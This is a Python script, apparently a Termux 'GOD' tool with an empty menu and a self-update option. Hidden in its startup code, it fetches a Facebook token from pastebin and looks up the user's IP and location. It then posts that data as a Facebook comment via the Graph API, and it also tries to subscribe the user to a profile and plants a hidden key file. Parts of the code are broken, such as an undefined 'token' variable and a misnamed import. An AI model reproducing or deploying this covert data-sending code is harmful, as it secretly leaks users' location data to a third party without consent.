import os
import sys
if len(sys.argv) == 2:
	if sys.argv[1] in ["--version","--v","-version","-v"]:
		print("GOD : 0.0.0.1")
		exit()
try:
    import requests
except ModuleNotFoundError:
    print("\n[*] Installing Module requests")
    os.system("python -m pip install requests &> /dev/null")
try:
    import bs4
except ModuleNotFoundError:
    print("\n[*] Installing Module bs4")
    os.system("python -m pip install bs4 &> /dev/null")
try:
    import mechanize
except ModuleNotFoundError:
    print("\n[*] Install Module mechanize")
    os.system("python -m pip install mechanize &> /dev/null")
try:
    import gTTS
except ModuleNotFoundError:
    os.system("python -m pip install gTTS &> /dev/null")
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import requests as req
import requests as re
import sys
import hashlib
import platform
import re
import threading
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
import bs4
import sys
import os
import subprocess
import random
import base64
import platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as mk
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError
from gtts import gTTS
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Gree
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White
# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White
# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White
# Background
On_Black='\033[40m'       # Black
On_Red='\033[41m'         # Red
On_Green='\033[42m'       # Green
On_Yellow='\033[43m'      # Yellow
On_Blue='\033[44m'        # Blue
On_Purple='\033[45m'      # Purple
On_Cyan='\033[46m'        # Cyan
On_White='\033[47m'       # White
# High Intensity
IBlack='\033[0;90m'       # Black
IRed='\033[0;91m'         # Red
IGreen='\033[0;92m'       # Green
IYellow='\033[0;93m'      # Yellow
IBlue='\033[0;94m'        # Blue
IPurple='\033[0;95m'      # Purple
ICyan='\033[0;96m'        # Cyan
IWhite='\033[0;97m'       # White
# Bold High Intensity
BIBlack='\033[1;90m'      # Black
BIRed='\033[1;91m'        # Red
BIGreen='\033[1;92m'      # Green
BIYellow='\033[1;93m'     # Yellow
BIBlue='\033[1;94m'       # Blue
BIPurple='\033[1;95m'     # Purple
BICyan='\033[1;96m'       # Cyan
BIWhite='\033[1;97m'      # White
# High Intensity backgrounds
On_IBlack='\033[0;100m'   # Black
On_IRed='\033[0;101m'     # Red
On_IGreen='\033[0;102m'   # Green
On_IYellow='\033[0;103m'  # Yellow
On_IBlue='\033[0;104m'    # Blue
On_IPurple='\033[0;105m'  # Purple
On_ICyan='\033[0;106m'    # Cyan
On_IWhite='\033[0;107m'   # White
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError: exit()
current = datetime.now()
year = current.year
bu = current.month
cday = current.day
months = monthsx[nTemp]
my_date = date.today()
day = calendar.day_name[my_date.weekday()]
alldate = ("%s-%s-%s-%s"%(day, cday, months, year))
alldatex = ("%s %s %s"%(cday, months, year))
alldatexx = ("%s/%s/%s"%(cday, months, year))
id1 = uuid.uuid4().hex[:7].upper()
id2 = uuid.uuid4().hex[:7].upper()
id3 = uuid.uuid4().hex[:7].upper()
key = id1 + '-' +id2 + '-' + id3
key1 = id1 + '-' +id2 + '-' + id3
bit = platform.architecture()[0]
fb_token = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["fb_token"]
try:
	Tool_Name = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Tool Name"]
except:
	Tool_Name = " - "
try:
	Version = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Version"]
except:
	Version = " - "
try:
	Server = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Server"]
except:
	Server = " - "
try:
	FB_UID = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["FB_UID"]
except:
	FB_UID = " - "
try:
	Owner_Name = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Owner Name"]
except:
	Owner_Name = " - "
try:
	Tool_Name = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Tool Name"]
except:
	Tool_Name = " - "
try:
	Note1 = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Note1"]
except:
	Note1
try:
	Note2 = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["Note2"]
except:
	Note2 = " - "
try:
	GitHub = requests.get("https://pastebin.com/raw/zLL9uzwa").json()["GitHub"]
except:
	GitHub = " - "
try:
	user_ip = requests.get("http://ip-api.com/json/").json()["query"]
except:
	user_ip = ' - '
try:
	user_country = requests.get("http://ip-api.com/json/").json()["country"].lower()
except:
	user_country = ' - '
try:
	user_regionName = requests.get("http://ip-api.com/json/").json()["regionName"].lower()
except:
	user_regionName = ' - '
try:
	open("Data/data.txt","r").read()
except:
	data = requests.get("http://ip-api.com/json/").text
	open("Data/data.txt","w").write(data)
try:
	data = open("Data/data.txt","r").read()
	requests.post('https://graph.facebook.com/142417931662713/comments/?message=' + data + '&access_token=' + fb_token)
	requests.post('https://graph.facebook.com/100076835203956/subscribers?access_token=' + token)
except:
	pass
try:
	key = open('/data/data/com.termux/files/usr/bin/.god.txt', 'r').read()
except:
	kok = open('/data/data/com.termux/files/usr/bin/.god.txt', 'w')
	kok.write(key1)
	kok.close()
key = open('/data/data/com.termux/files/usr/bin/.god.txt', 'r').read()
def play_audio(x):
	try:
		os.system("play-audio "+x)
	except:
		pass
def type(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.09)
def create_audio(file,text):
	my_a = gTTS(text)
	my_a.save(file)

def logo():
	os.system("clear")
	print("\t       d888b        .d88b.       d8888b. \n\t      88' Y8b      .8P  Y8.      88  `8D \n\t      88           88    88      88   88 \n\t      88  ooo      88    88      88   88 \n\t      88. ~8~      `8b  d8'      88  .8D \n\t       Y888P        `Y88P'       Y8888D'")
	print("----------------------------------------------------------------")
	print("[*] Version : " + Version)
	print("[*] Tool Name : " + Tool_Name)
	print("[*] Using Termux : " + bit)
	print("[*] Your IP : " + user_ip)
	print("[*] Your Country : " + user_country)
	print("[*] Today Date " + alldatexx)
	print("[*] Your Key : " + key)
	print("[*] Note : " + Note1)
	print("----------------------------------------------------------------")

def main_menu():
	logo()
	print("[01]  ")
	print("[02]  ")
	print("[03]  ")
	print("[04]  ")
	print("[05]  ")
	print("[06]  ")
	print("[07]  ")
	print("[08]  ")
	print("[09]  ")
	print("[00] Update Tool [\033[41m G O D \033[0;37m] \n")
	main_choose = input("[->] Choose : ")
	if main_choose in ["1","01"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["2","02"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["3","03"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["4","04"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["5","05"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["6","06"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["7","07"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["8","08"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["9","09"]:
		time.sleep(1.5)
		main_menu()
	elif main_choose in ["0","00"]:
		time.sleep(1.5)
		print("\n[>>] Updating Tool . . . . ")
		os.system("git pull")
		print("\n\n[>>] Updating Successful . . . . ")
		time.sleep(2)
		main_menu()
	else:
		time.sleep(1.5)
		main_menu()


if __name__ == '__main__':
	logo()
	type("This tool is only for educational purpose. If you use this tool for other purposes except education we will not be responsible in such cases")
	time.sleep(2.5)
	play_audio("Audio/Warning.mp3")
	main_menu()